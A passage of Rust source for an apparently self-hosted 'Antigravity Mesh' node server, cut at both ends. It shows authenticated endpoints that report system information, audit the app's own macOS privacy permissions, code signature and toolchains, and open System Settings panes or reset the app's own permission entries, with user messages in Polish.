) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let opt = check_for_updates().await;
    let mut w = state.update_offer.write().await;
    *w = opt.clone();
    Ok(Json(json!({
        "current_version": env!("CARGO_PKG_VERSION"),
        "latest_version": opt,
        "update_available": opt.is_some()
    })))
}

async fn handle_system(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let mut sys = System::new_all();
    sys.refresh_all();

    let total_ram_mb = sys.total_memory() / 1024 / 1024;
    let used_ram_mb = sys.used_memory() / 1024 / 1024;
    let free_ram_mb = sys.free_memory() / 1024 / 1024;

    let cpus = sys.cpus();
    let cpu_count = cpus.len();
    let cpu_brand = cpus
        .first()
        .map(|c| c.brand().to_string())
        .unwrap_or_default();
    let global_cpu_usage = sys.global_cpu_usage();

    let disks = Disks::new_with_refreshed_list();
    let mut disk_list = Vec::new();
    for d in &disks {
        disk_list.push(json!({
            "name": d.name().to_string_lossy(),
            "mount_point": d.mount_point().to_string_lossy(),
            "total_gb": d.total_space() / 1024 / 1024 / 1024,
            "available_gb": d.available_space() / 1024 / 1024 / 1024,
        }));
    }

    let cwd = std::env::current_dir()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();

    let os_name = if cfg!(target_os = "macos") {
        "macOS"
    } else if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        std::env::consts::OS
    };
    let os_ver = System::os_version().unwrap_or_default();
    let arch = match std::env::consts::ARCH {
        "aarch64" => "ARM64",
        "x86_64" => "x64",
        other => other,
    };
    let os_display = if os_ver.is_empty() {
        format!("{} ({})", os_name, arch)
    } else {
        format!("{} {} ({})", os_name, os_ver, arch)
    };

    Ok(Json(json!({
        "node_name": state.node_name,
        "os_name": os_name,
        "os_version": os_ver,
        "os_display": os_display,
        "arch": arch,
        "kernel_version": System::kernel_version().unwrap_or_default(),
        "cpu_count": cpu_count,
        "cpu_brand": cpu_brand,
        "cpu_usage_pct": global_cpu_usage,
        "memory": {
            "total_mb": total_ram_mb,
            "used_mb": used_ram_mb,
            "free_mb": free_ram_mb,
            "usage_pct": if total_ram_mb > 0 { (used_ram_mb as f64 / total_ram_mb as f64) * 100.0 } else { 0.0 }
        },
        "uptime_secs": START_INSTANT.get().map(|i| i.elapsed().as_secs()).unwrap_or(0),
        "request_count": REQUEST_COUNTER.load(Ordering::Relaxed),
        "recent_logs": RECENT_LOGS.lock().map(|l| l.clone()).unwrap_or_default(),
        "disks": disk_list,
        "cwd": cwd,
        "engine": "rust-native"
    })))
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PermissionAuditReport {
    pub timestamp: u64,
    pub platform: String,
    pub os_version: String,
    pub arch: String,
    pub all_granted: bool,
    pub overall_status: String, // "all_granted", "warnings", "action_required"
    pub summary: String,
    pub accessibility: AccessibilityCheck,
    pub full_disk_access: FullDiskAccessCheck,
    pub filesystem: FileSystemCheck,
    pub codesign: CodeSignCheck,
    pub process_execution: ProcessExecutionCheck,
    pub toolchains: ToolchainsCheck,
    pub network: NetworkDiagnosticCheck,
    pub autostart_enabled: bool,
    pub recommendations: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AccessibilityCheck {
    pub granted: bool,
    pub status: String, // "granted", "denied", "not_applicable", "error"
    pub message: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FullDiskAccessCheck {
    pub granted: bool,
    pub status: String, // "granted", "denied", "not_applicable"
    pub probed_path: String,
    pub message: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PathPermission {
    pub name: String,
    pub path: String,
    pub readable: bool,
    pub writable: bool,
    pub exists: bool,
    pub error: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileSystemCheck {
    pub all_passed: bool,
    pub paths: Vec<PathPermission>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CodeSignCheck {
    pub valid: bool,
    pub identifier: Option<String>,
    pub team_id: Option<String>,
    pub authority: Option<String>,
    pub designated_requirement_ok: bool,
    pub quarantine_active: bool,
    pub message: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ProcessExecutionCheck {
    pub can_spawn: bool,
    pub latency_ms: u64,
    pub message: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ToolchainItem {
    pub name: String,
    pub found: bool,
    pub path: Option<String>,
    pub version: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ToolchainsCheck {
    pub items: Vec<ToolchainItem>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct NetworkDiagnosticCheck {
    pub listen_port: u16,
    pub tailscale_detected: bool,
    pub tailscale_ip: Option<String>,
    pub lan_ips: Vec<String>,
    pub internet_connectivity: bool,
    pub ping_ms: Option<u64>,
}

fn check_accessibility() -> AccessibilityCheck {
    #[cfg(target_os = "macos")]
    {
        use std::ffi::CString;
        unsafe {
            let path = CString::new("/System/Library/Frameworks/ApplicationServices.framework/ApplicationServices").unwrap();
            let handle = libc::dlopen(path.as_ptr(), libc::RTLD_LAZY);
            if handle.is_null() {
                return AccessibilityCheck {
                    granted: false,
                    status: "error".to_string(),
                    message: "Nie można załadować ApplicationServices.framework".to_string(),
                };
            }
            let sym_name = CString::new("AXIsProcessTrusted").unwrap();
            let sym = libc::dlsym(handle, sym_name.as_ptr());
            if sym.is_null() {
                libc::dlclose(handle);
                return AccessibilityCheck {
                    granted: false,
                    status: "error".to_string(),
                    message: "Symbol AXIsProcessTrusted nie został odnaleziony".to_string(),
                };
            }
            let func: extern "C" fn() -> bool = std::mem::transmute(sym);
            let trusted = func();
            libc::dlclose(handle);
            if trusted {
                AccessibilityCheck {
                    granted: true,
                    status: "granted".to_string(),
                    message: "Uprawnienia Dostępności (macOS TCC Accessibility) są aktywne.".to_string(),
                }
            } else {
                AccessibilityCheck {
                    granted: false,
                    status: "denied".to_string(),
                    message: "Brak uprawnień Dostępności (AXIsProcessTrusted = false). Jeśli suwak w Ustawieniach jest już włączony, wyłącz go i włącz ponownie (wymóg macOS TCC po aktualizacji binarki).".to_string(),
                }
            }
        }
    }

    #[cfg(not(target_os = "macos"))]
    {
        AccessibilityCheck {
            granted: true,
            status: "not_applicable".to_string(),
            message: "Uprawnienie Dostępności nie jest wymagane na tej platformie.".to_string(),
        }
    }
}

fn check_full_disk_access() -> FullDiskAccessCheck {
    #[cfg(target_os = "macos")]
    {
        // Probe a TCC-protected directory synchronously (1500ms timeout).
        // Three outcomes:
        //   Ok(())      → directory readable → FDA granted
        //   Err(EPERM)  → definitive denial from OS → FDA denied
        //   Timeout     → macOS TCC dialog is pending / very slow FS
        //                  → treat as 'unknown' (non-critical) to avoid
        //                    false alarms during the system prompt window.
        fn probe_fda(path: &std::path::Path) -> &'static str {
            let p = path.to_path_buf();
            let (tx, rx) = std::sync::mpsc::channel();
            let _ = std::thread::Builder::new()
                .name("fda-probe".to_string())
                .spawn(move || {
                    let res = fs::read_dir(&p);
                    let _ = tx.send(res.map(|_| ()));
                });
            match rx.recv_timeout(Duration::from_millis(1500)) {
                Ok(Ok(())) => "granted",
                Ok(Err(e)) if e.raw_os_error() == Some(1)
                    || e.kind() == std::io::ErrorKind::PermissionDenied => "denied",
                Ok(Err(_)) => "unknown", // unexpected fs error – don't alarm
                Err(_) => "unknown",     // timeout: TCC dialog pending or slow fs
            }
        }

        if let Some(home) = dirs_home() {
            let safari_dir = home.join("Library").join("Safari");
            if safari_dir.exists() {
                let result = probe_fda(&safari_dir);
                return match result {
                    "granted" => FullDiskAccessCheck {
                        granted: true,
                        status: "granted".to_string(),
                        probed_path: safari_dir.to_string_lossy().to_string(),
                        message: "Pełny dostęp do dysku (FDA) jest aktywny.".to_string(),
                    },
                    "denied" => FullDiskAccessCheck {
                        granted: false,
                        status: "denied".to_string(),
                        probed_path: safari_dir.to_string_lossy().to_string(),
                        message: "Brak Pełnego Dostępu do Dysku (macOS TCC zablokowało ~/Library/Safari). Włącz w Ustawieniach → Prywatność → Pełny dostęp do dysku.".to_string(),
                    },
                    _ => FullDiskAccessCheck {
                        granted: true,
                        status: "unknown".to_string(),
                        probed_path: safari_dir.to_string_lossy().to_string(),
                        message: "Nie można jednoznacznie sprawdzić FDA (timeout probe lub oczekujący dialog systemu). Prawdopodobnie OK.".to_string(),
                    },
                };
            }

            let mail_dir = home.join("Library").join("Mail");
            if mail_dir.exists() {
                let result = probe_fda(&mail_dir);
                return match result {
                    "granted" => FullDiskAccessCheck {
                        granted: true,
                        status: "granted".to_string(),
                        probed_path: mail_dir.to_string_lossy().to_string(),
                        message: "Pełny dostęp do dysku (FDA) jest aktywny.".to_string(),
                    },
                    "denied" => FullDiskAccessCheck {
                        granted: false,
                        status: "denied".to_string(),
                        probed_path: mail_dir.to_string_lossy().to_string(),
                        message: "Brak Pełnego Dostępu do Dysku (macOS TCC zablokowało ~/Library/Mail). Włącz w Ustawieniach → Prywatność → Pełny dostęp do dysku.".to_string(),
                    },
                    _ => FullDiskAccessCheck {
                        granted: true,
                        status: "unknown".to_string(),
                        probed_path: mail_dir.to_string_lossy().to_string(),
                        message: "Nie można jednoznacznie sprawdzić FDA (timeout probe lub oczekujący dialog systemu). Prawdopodobnie OK.".to_string(),
                    },
                };
            }
        }

        FullDiskAccessCheck {
            granted: true,
            status: "granted".to_string(),
            probed_path: "TCC checks passed".to_string(),
            message: "Pełny dostęp do dysku: brak restrykcji TCC na testowanych ścieżkach systemowych.".to_string(),
        }
    }

    #[cfg(not(target_os = "macos"))]
    {
        FullDiskAccessCheck {
            granted: true,
            status: "not_applicable".to_string(),
            probed_path: "N/A".to_string(),
            message: "Pełny dostęp do dysku (FDA) jest specyficzny dla macOS i nie jest wymagany na tym systemie.".to_string(),
        }
    }
}

fn safe_probe_read_dir(path: &std::path::Path, timeout_ms: u64) -> Result<(), String> {
    let p = path.to_path_buf();
    let (tx, rx) = std::sync::mpsc::channel();
    let _ = std::thread::Builder::new()
        .name("fs-probe-read".to_string())
        .spawn(move || {
            let res = fs::read_dir(&p);
            let _ = tx.send(res.map(|_| ()));
        });

    match rx.recv_timeout(Duration::from_millis(timeout_ms)) {
        Ok(Ok(())) => Ok(()),
        Ok(Err(e)) => {
            if e.raw_os_error() == Some(1) || e.kind() == std::io::ErrorKind::PermissionDenied {
                Err("Odmowa dostępu (macOS TCC / brak uprawnień)".to_string())
            } else {
                Err(format!("Błąd odczytu: {}", e))
            }
        }
        Err(_) => {
            Err("Wstrzymano przez system (blokada macOS TCC: Pliki i foldery / Pełny dostęp do dysku)".to_string())
        }
    }
}

fn safe_probe_write(path: &std::path::Path, timeout_ms: u64) -> (bool, Option<String>) {
    let p = path.to_path_buf();
    let (tx, rx) = std::sync::mpsc::channel();
    let _ = std::thread::Builder::new()
        .name("fs-probe-write".to_string())
        .spawn(move || {
            let probe_file = p.join(format!(".__mesh_perm_test_{}", rand::random::<u32>()));
            let res = match fs::write(&probe_file, b"antigravity_mesh_probe") {
                Ok(_) => {
                    let _ = fs::remove_file(&probe_file);
                    (true, None)
                }
                Err(e) => (false, Some(format!("Brak uprawnień zapisu: {}", e))),
            };
            let _ = tx.send(res);
        });

    match rx.recv_timeout(Duration::from_millis(timeout_ms)) {
        Ok(res) => res,
        Err(_) => (false, Some("Zapis wstrzymany przez system (blokada macOS TCC / brak uprawnień)".to_string())),
    }
}

fn probe_path(name: &str, path: &std::path::Path, test_write: bool) -> PathPermission {
    let path_str = path.to_string_lossy().to_string();
    let exists = path.exists();
    if !exists {
        return PathPermission {
            name: name.to_string(),
            path: path_str,
            readable: false,
            writable: false,
            exists: false,
            error: Some("Ścieżka nie istnieje".to_string()),
        };
    }

    let (readable, read_err) = match safe_probe_read_dir(path, 400) {
        Ok(()) => (true, None),
        Err(e) => (false, Some(e)),
    };

    if !readable {
        return PathPermission {
            name: name.to_string(),
            path: path_str,
            readable: false,
            writable: false,
            exists: true,
            error: read_err,
        };
    }

    let (writable, write_err) = if test_write {
        safe_probe_write(path, 400)
    } else {
        (true, None)
    };

    PathPermission {
        name: name.to_string(),
        path: path_str,
        readable,
        writable,
        exists: true,
        error: write_err,
    }
}

fn check_filesystem() -> FileSystemCheck {
    let mut paths = Vec::new();
    let home = dirs_home().unwrap_or_else(|| PathBuf::from("."));

    // 1. Home
    paths.push(probe_path("Katalog domowy (~)", &home, true));

    // 2. Downloads
    let downloads = home.join("Downloads");
    if downloads.exists() {
        paths.push(probe_path("Katalog Pobrane (~/Downloads)", &downloads, false));
    }

    // 3. Documents
    let documents = home.join("Documents");
    if documents.exists() {
        paths.push(probe_path("Katalog Dokumenty (~/Documents)", &documents, false));
    }

    // 4. Desktop
    let desktop = home.join("Desktop");
    if desktop.exists() {
        paths.push(probe_path("Katalog Biurko (~/Desktop)", &desktop, false));
    }

    // 5. Antigravity / Gemini config
    let gemini = home.join(".gemini");
    if gemini.exists() {
        paths.push(probe_path("Katalog Antigravity (~/.gemini)", &gemini, true));
    }

    // 6. Current working directory / Workspace
    if let Ok(cwd) = std::env::current_dir() {
        if cwd != PathBuf::from("/") {
            paths.push(probe_path("Katalog roboczy projektu (CWD)", &cwd, true));
        } else {
            // Gdy aplikacja jest uruchamiana przez macOS LaunchServices (open .app), CWD to root (/)
            // Root systemu w macOS (APFS SSV) jest zawsze tylko do odczytu, więc sprawdzamy katalog danych węzła.
            let mesh_data = home.join(".antigravity-mesh");
            let _ = fs::create_dir_all(&mesh_data);
            paths.push(probe_path("Katalog danych (~/.antigravity-mesh)", &mesh_data, true));
        }
    }

    let all_passed = paths.iter().all(|p| p.readable && (!p.writable || p.error.is_none()));

    FileSystemCheck {
        all_passed,
        paths,
    }
}

fn check_codesign() -> CodeSignCheck {
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => {
            return CodeSignCheck {
                valid: false,
                identifier: None,
                team_id: None,
                authority: None,
                designated_requirement_ok: false,
                quarantine_active: false,
                message: format!("Nie można ustalić ścieżki pliku wykonywalnego: {}", e),
            };
        }
    };

    #[cfg(target_os = "macos")]
    {
        let exe_str = exe_path.to_string_lossy().to_string();

        let quarantine_output = std::process::Command::new("xattr")
            .arg("-p")
            .arg("com.apple.quarantine")
            .arg(&exe_str)
            .output();
        let quarantine_active = match quarantine_output {
            Ok(out) => out.status.success() && !out.stdout.is_empty(),
            Err(_) => false,
        };

        let dv_output = std::process::Command::new("codesign")
            .arg("-dv")
            .arg(&exe_str)
            .output();

        let mut valid = false;
        let mut identifier = None;
        let mut team_id = None;
        let mut authority = None;

        if let Ok(out) = dv_output {
            let combined = format!(
                "{}\n{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            for line in combined.lines() {
                let trimmed = line.trim();
                if let Some(id) = trimmed.strip_prefix("Identifier=") {
                    identifier = Some(id.to_string());
                } else if let Some(team) = trimmed.strip_prefix("TeamIdentifier=") {
                    if team != "not set" {
                        team_id = Some(team.to_string());
                    }
                } else if let Some(auth) = trimmed.strip_prefix("Authority=") {
                    authority = Some(auth.to_string());
                }
            }
            valid = out.status.success();
        }

        let req_output = std::process::Command::new("codesign")
            .arg("-d")
            .arg("-r-")
            .arg(&exe_str)
            .output();

        let mut designated_requirement_ok = false;
        if let Ok(out) = req_output {
            let combined = format!(
                "{}\n{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            if combined.contains("identifier \"com.antigravity.mesh\"") {
                designated_requirement_ok = true;
            }
        }

        let msg = if quarantine_active {
            "Plik wykonywalny posiada flagę kwarantanny macOS (Gatekeeper). Zalecane usunięcie flagi.".to_string()
        } else if valid {
            "Podpis cyfrowy binarki jest poprawny, brak kwarantanny macOS.".to_string()
        } else {
            "Binarka nie posiada certyfikowanego podpisu cyfrowego lub podpis jest ad-hoc.".to_string()
        };

        CodeSignCheck {
            valid,
            identifier,
            team_id,
            authority,
            designated_requirement_ok,
            quarantine_active,
            message: msg,
        }
    }

    #[cfg(not(target_os = "macos"))]
    {
        CodeSignCheck {
            valid: true,
            identifier: Some("com.antigravity.mesh".to_string()),
            team_id: None,
            authority: None,
            designated_requirement_ok: true,
            quarantine_active: false,
            message: "Weryfikacja integralności binarki na tej platformie zakończona sukcesem.".to_string(),
        }
    }
}

async fn check_process_execution() -> ProcessExecutionCheck {
    let start = std::time::Instant::now();
    #[cfg(windows)]
    let cmd_res = tokio::process::Command::new("cmd")
        .args(&["/c", "echo __agy_probe_ok__"])
        .output()
        .await;

    #[cfg(not(windows))]
    let cmd_res = tokio::process::Command::new("sh")
        .args(&["-c", "echo __agy_probe_ok__"])
        .output()
        .await;

    let latency_ms = start.elapsed().as_millis() as u64;

    match cmd_res {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            if stdout.contains("__agy_probe_ok__") {
                ProcessExecutionCheck {
                    can_spawn: true,
                    latency_ms,
                    message: format!("Pomyślnie uruchomiono proces potomny (czas odpowiedzi: {} ms).", latency_ms),
                }
            } else {
                ProcessExecutionCheck {
                    can_spawn: false,
                    latency_ms,
                    message: "Proces potomny nie zwrócił oczekiwanej odpowiedzi testowej.".to_string(),
                }
            }
        }
        Err(e) => {
            ProcessExecutionCheck {
                can_spawn: false,
                latency_ms,
                message: format!("Błąd uruchamiania procesu potomnego: {}", e),
            }
        }
    }
}

async fn which_bin(name: &str) -> Option<String> {
    #[cfg(windows)]
    let finder = "where.exe";
    #[cfg(not(windows))]
    let finder = "which";

    if let Ok(output) = tokio::process::Command::new(finder).arg(name).output().await {
        if output.status.success() {
            let found = String::from_utf8_lossy(&output.stdout)
                .lines()
                .next()
                .unwrap_or("")
                .trim()
                .to_string();
            if !found.is_empty() && std::path::Path::new(&found).exists() {
                return Some(found);
            }
        }
    }
    None
}

async fn get_cmd_version(path: &str, args: &[&str]) -> Option<String> {
    if let Ok(output) = tokio::process::Command::new(path).args(args).output().await {
        if output.status.success() {
            let line = String::from_utf8_lossy(&output.stdout)
                .lines()
                .next()
                .unwrap_or("")
                .trim()
                .to_string();
            if !line.is_empty() {
                return Some(line);
            }
        }
    }
    None
}

async fn check_toolchains(state: &AppState) -> ToolchainsCheck {
    let mut items = Vec::new();

    // 1. agy
    let agy_path_opt = state.agy_cli_path.clone();
    let (agy_found, agy_ver) = if let Some(ref path) = agy_path_opt {
        let ver = get_cmd_version(path, &["--version"]).await;
        (true, ver)
    } else {
        (false, None)
    };
    items.push(ToolchainItem {
        name: "agy (Antigravity CLI)".to_string(),
        found: agy_found,
        path: agy_path_opt,
        version: agy_ver,
    });

    // 2. git
    let git_path = which_bin("git").await;
    let git_ver = if let Some(ref p) = git_path {
        get_cmd_version(p, &["--version"]).await
    } else {
        None
    };
    items.push(ToolchainItem {
        name: "git".to_string(),
        found: git_path.is_some(),
        path: git_path,
        version: git_ver,
    });

    // 3. python3
    let py_path = which_bin("python3").await;
    let py_ver = if let Some(ref p) = py_path {
        get_cmd_version(p, &["--version"]).await
    } else {
        None
    };
    items.push(ToolchainItem {
        name: "python3".to_string(),
        found: py_path.is_some(),
        path: py_path,
        version: py_ver,
    });

    // 4. node
    let node_path = which_bin("node").await;
    let node_ver = if let Some(ref p) = node_path {
        get_cmd_version(p, &["--version"]).await
    } else {
        None
    };
    items.push(ToolchainItem {
        name: "node".to_string(),
        found: node_path.is_some(),
        path: node_path,
        version: node_ver,
    });

    // 5. cargo
    let cargo_path = which_bin("cargo").await;
    let cargo_ver = if let Some(ref p) = cargo_path {
        get_cmd_version(p, &["--version"]).await
    } else {
        None
    };
    items.push(ToolchainItem {
        name: "cargo".to_string(),
        found: cargo_path.is_some(),
        path: cargo_path,
        version: cargo_ver,
    });

    ToolchainsCheck { items }
}

async fn check_network(state: &AppState) -> NetworkDiagnosticCheck {
    let listen_port = state.port;
    let lan_ip = get_local_lan_ip();
    let mut lan_ips = Vec::new();
    if !lan_ip.is_empty() && lan_ip != "127.0.0.1" {
        lan_ips.push(lan_ip);
    }

    let mut tailscale_ip = None;
    if let Ok(out) = tokio::process::Command::new("tailscale")
        .args(&["ip", "-4"])
        .output()
        .await
    {
        if out.status.success() {
            let ip = String::from_utf8_lossy(&out.stdout).trim().to_string();
            if !ip.is_empty() && ip.starts_with("100.") {
                tailscale_ip = Some(ip);
            }
        }
    }

    if tailscale_ip.is_none() {
        #[cfg(not(windows))]
        if let Ok(out) = tokio::process::Command::new("ifconfig").output().await {
            let s = String::from_utf8_lossy(&out.stdout);
            for line in s.lines() {
                if let Some(pos) = line.find("inet 100.") {
                    let rem = &line[pos + 5..];
                    let ip = rem.split_whitespace().next().unwrap_or("");
                    if !ip.is_empty() {
                        tailscale_ip = Some(ip.to_string());
                        break;
                    }
                }
            }
        }
    }

    let start = std::time::Instant::now();
    let internet_connectivity = match tokio::time::timeout(
        Duration::from_millis(2500),
        tokio::net::TcpStream::connect("1.1.1.1:53"),
    ).await {
        Ok(Ok(_)) => true,
        _ => match tokio::time::timeout(
            Duration::from_millis(2500),
            tokio::net::TcpStream::connect("8.8.8.8:53"),
        ).await {
            Ok(Ok(_)) => true,
            _ => false,
        },
    };
    let ping_ms = if internet_connectivity {
        Some(start.elapsed().as_millis() as u64)
    } else {
        None
    };

    NetworkDiagnosticCheck {
        listen_port,
        tailscale_detected: tailscale_ip.is_some(),
        tailscale_ip,
        lan_ips,
        internet_connectivity,
        ping_ms,
    }
}

async fn run_permission_audit(state: &AppState) -> PermissionAuditReport {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);

    let platform = if cfg!(target_os = "macos") {
        "macOS"
    } else if cfg!(target_os = "windows") {
        "Windows"
    } else if cfg!(target_os = "linux") {
        "Linux"
    } else {
        std::env::consts::OS
    }.to_string();

    let os_version = System::os_version().unwrap_or_default();
    let arch = match std::env::consts::ARCH {
        "aarch64" => "ARM64",
        "x86_64" => "x64",
        other => other,
    }.to_string();

    let accessibility = check_accessibility();
    let full_disk_access = check_full_disk_access();
    let filesystem = check_filesystem();
    let codesign = check_codesign();
    let process_execution = check_process_execution().await;
    let toolchains = check_toolchains(state).await;
    let network = check_network(state).await;
    let autostart_enabled = autostart::is_autostart_enabled();

    let mut recommendations = Vec::new();

    if !accessibility.granted && accessibility.status == "denied" {
        recommendations.push("Nadaj uprawnienia Dostępności: Otwórz Ustawienia systemowe -> Prywatność i ochrona -> Dostępność i włącz Antigravity Mesh / Terminal.".to_string());
    }

    // Only recommend FDA fix when definitively denied — not on timeout/unknown.
    if !full_disk_access.granted && full_disk_access.status == "denied" {
        recommendations.push("Włącz Pełny dostęp do dysku: Otwórz Ustawienia systemowe -> Prywatność i ochrona -> Pełny dostęp do dysku, aby umożliwić przeszukiwanie chronionych folderów systemowych.".to_string());
    }

    if codesign.quarantine_active {
        if let Ok(exe) = std::env::current_exe() {
            recommendations.push(format!("Usuń flagę kwarantanny macOS: xattr -d com.apple.quarantine \"{}\"", exe.display()));
        }
    }

    if !filesystem.all_passed {
        let fda_missing = !full_disk_access.granted && full_disk_access.status == "denied";
        for p in &filesystem.paths {
            if let Some(ref err) = p.error {
                let is_tcc_protected = p.path.contains("Downloads") || p.path.contains("Documents") || p.path.contains("Desktop");
                if is_tcc_protected && fda_missing {
                    // Objaw braku Pełnego Dostępu do Dysku – instrukcja naprawcza jest już w zaleceniach FDA.
                    continue;
                }
                recommendations.push(format!("Folder {}: Upewnij się, że użytkownik ma prawa dostępu (wykryto: {})", p.name, err));
            }
        }
    }

    if !process_execution.can_spawn {
        recommendations.push("Uruchamianie procesów potomnych jest zablokowane. Sprawdź ustawienia piaskownicy lub politykę bezpieczeństwa systemu.".to_string());
    }

    let agy_item = toolchains.items.iter().find(|i| i.name.starts_with("agy"));
    if let Some(agy) = agy_item {
        if !agy.found {
            recommendations.push("Zainstaluj CLI Antigravity ('agy') lub utwórz dowiązanie symboliczne w /opt/homebrew/bin lub /usr/local/bin, aby aktywować sterowanie agentem AI (/ask).".to_string());
        }
    }

    if !network.tailscale_detected {
        recommendations.push("Nie wykryto adresu Tailscale (100.x.y.z). Dostęp do węzła z telefonu spoza lokalnego Wi-Fi wymaga włączenia Tailscale.".to_string());
    }

    // 'unknown' FDA status (probe timeout) is treated as non-blocking — don't block on it.
    let critical_ok = accessibility.granted
        && (full_disk_access.granted
            || full_disk_access.status == "not_applicable"
            || full_disk_access.status == "unknown")
        && filesystem.all_passed
        && process_execution.can_spawn
        && !codesign.quarantine_active;

    let (all_granted, overall_status, summary) = if critical_ok && recommendations.is_empty() {
        (
            true,
            "all_granted".to_string(),
            "Wszystkie uprawnienia systemowe, dostęp do plików i środowisko CLI są w pełni sprawne.".to_string(),
        )
    } else if critical_ok {
        (
            false,
            "warnings".to_string(),
            "Węzeł jest sprawny operacyjnie, lecz zalecono uzupełnienie kilku opcjonalnych konfiguracji.".to_string(),
        )
    } else {
        (
            false,
            "action_required".to_string(),
            "Wykryto brakujące uprawnienia krytyczne. Wymagana interwencja użytkownika w systemie.".to_string(),
        )
    };

    PermissionAuditReport {
        timestamp: now,
        platform,
        os_version,
        arch,
        all_granted,
        overall_status,
        summary,
        accessibility,
        full_disk_access,
        filesystem,
        codesign,
        process_execution,
        toolchains,
        network,
        autostart_enabled,
        recommendations,
    }
}

async fn handle_permissions(
    headers: HeaderMap,
    State(state): State<AppState>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        log_message("⚠️ [handle_permissions] Unauthorized request");
        return Err(StatusCode::UNAUTHORIZED);
    }

    log_message("🔍 [handle_permissions] Rozpoczęto audyt uprawnień węzła...");
    let report = run_permission_audit(&state).await;
    log_message("✅ [handle_permissions] Audyt uprawnień ukończony pomyślnie.");
    Ok(Json(report))
}

#[derive(Deserialize, Debug)]
pub struct PermissionFixRequest {
    pub action: String,
}

#[derive(Serialize, Debug)]
pub struct PermissionFixResponse {
    pub success: bool,
    pub action: String,
    pub message: String,
}

async fn handle_permissions_fix(
    headers: HeaderMap,
    State(state): State<AppState>,
    Json(payload): Json<PermissionFixRequest>,
) -> Result<impl IntoResponse, StatusCode> {
    if !verify_auth(&headers, &state).await {
        log_message("⚠️ [handle_permissions_fix] Unauthorized request");
        return Err(StatusCode::UNAUTHORIZED);
    }

    log_message(&format!("🛠️ [handle_permissions_fix] Requested action: {}", payload.action));

    let (success, message) = match payload.action.as_str() {
        "open_accessibility" => {
            #[cfg(target_os = "macos")]
            {
                let res = std::process::Command::new("open")
                    .arg("x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility")
                    .spawn();
                match res {
                    Ok(_) => (true, "Otwarto Ustawienia systemowe macOS -> Dostępność. Włącz suwak dla Antigravity Mesh.".to_string()),
                    Err(e) => (false, format!("Nie udało się otworzyć ustawień Dostępności: {}", e)),
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                (false, "Ta akcja jest specyficzna dla systemu macOS.".to_string())
            }
        }
        "reset_tcc" => {
            #[cfg(target_os = "macos")]
            {
                let _ = std::process::Command::new("tccutil")
                    .args(["reset", "Accessibility", "com.antigravity.mesh"])
                    .output();
                let _ = std::process::Command::new("open")
                    .arg("x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility")
                    .spawn();
                (true, "Zresetowano wpis TCC dla Antigravity Mesh. Włącz suwak ponownie w oknie Ustawień.".to_string())
            }
            #[cfg(not(target_os = "macos"))]
            {
                (false, "Ta akcja jest specyficzna dla systemu macOS.".to_string())
            }
        }
        "open_fda" => {
            #[cfg(target_os = "macos")]
            {
                let res = std::process::Command::new("open")
                    .arg("x-apple.systempreferences:com.apple.preference.security?Privacy_AllFiles")
                    .spawn();
                match res {
                    Ok(_) => (true, "Otwarto Ustawienia systemowe macOS -> Pełny dostęp do dysku. Włącz suwak lub dodaj aplikację.".to_string()),
                    Err(e) => (false, format!("Nie udało się otworzyć ustawień Pełnego Dostępu do Dysku: {}", e)),
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                (false, "Ta akcja jest specyficzna dla systemu macOS.".to_string())
            }
        }
        "open_privacy" => {
            #[cfg(target_os = "macos")]
            {
                let res = std::process::Command::new("open")
                    .arg("x-apple.systempreferences:com.apple.preference.security")
                    .spawn();
                match res {
                    Ok(_) => (true, "Otwarto Ustawienia systemowe macOS -> Prywatność i ochrona.".to_string()),
                    Err(e) => (false, format!("Nie udało się otworzyć Ustawień systemowych: {}", e)),
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                (false, "Ta akcja jest specyficzna dla systemu macOS.".to_string())
            }
        }
        "reveal_in_finder" => {
            #[cfg(target_os = "macos")]
            {
                let app_path = "/Applications/AntigravityMesh.app";
                let target = if std::path::Path::new(app_path).exists() {
                    std::path::PathBuf::from(app_path)
                } else if let Ok(exe) = std::env::current_exe() {
                    exe
                } else {
                    std::path::PathBuf::from("/Applications")
                };

                let res = std::process::Command::new("open")
                    .arg("-R")
                    .arg(&target)
                    .spawn();
                match res {
                    Ok(_) => (true, format!("Pokazano plik {} w Finderze. Możesz przeciągnąć go do listy w Ustawieniach.", target.display())),
                    Err(e) => (false, format!("Nie udało się otworzyć Findera: {}", e)),
                }
            }
            #[cfg(not(target_os = "macos"))]
            {
                (false, "Ta akcja jest specyficzna dla systemu macOS.".to_string())
            }
        }
        "remove_quarantine" => {
            #[cfg(target_os = "macos")]
            {
                let mut errors = Vec::new();
                let app_path = "/Applications/AntigravityMesh.app";
                if std::path::Path::new(app_path).exists() {
                    let out = std::process::Command::new("xattr")
